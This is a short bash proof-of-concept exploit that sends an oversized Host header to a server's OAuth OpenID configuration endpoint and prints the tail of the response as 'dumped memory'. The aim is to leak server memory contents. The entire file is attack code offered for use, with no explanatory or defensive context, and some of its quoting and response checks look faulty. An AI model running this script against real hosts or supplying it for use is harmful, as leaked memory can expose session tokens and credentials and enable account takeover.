#!/bin/bash

hostname="$1" # first parameter

header_value=$(yes a | head -n 24576 | tr -d '\n')

headers="-H 'Host:$header_value'"

response=$(curl -s -k -H "$headers" "https://$hostname/oauth/idp/.well-known/openid-configuration" --connect-timeout 10)

if [ $? -eq 0 ] && [ "$(echo $response | cut -c 1-3)" == "200" ]; then
	echo "--- Dumped memory ---"
	echo "$response" | cut -c 131051-
	echo "---      End      ---"
else
	echo "Could not dump memory"
fi
